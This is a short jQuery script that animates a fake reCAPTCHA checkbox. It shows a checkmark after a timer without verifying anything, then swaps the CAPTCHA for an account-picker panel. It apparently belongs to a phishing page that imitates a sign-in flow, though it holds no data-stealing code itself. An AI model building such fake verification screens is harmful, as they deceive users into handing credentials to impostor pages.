$( document ).ready(function() {

    //checkbox hover
    $( "#ldyzoinsxigm" ).hover(
        function() {
            $(this).addClass("recaptcha-checkbox-hover");
        }, function() {
            $(this).removeClass("recaptcha-checkbox-hover");
        }
    );

    //checkbox click
    $( "#border" ).click(function() {
        $( this ).remove();
        $( "#checkmark" ).hide();
        setTimeout(function () {
            $( "#loading" ).remove();
            $( "#checkmark" ).show();
        }, 2000);

        //pick-account
        setTimeout(function () {
            $( "#recaptcha" ).remove();
            $( "#pick-account" ).show();
        }, 1000);
    });

});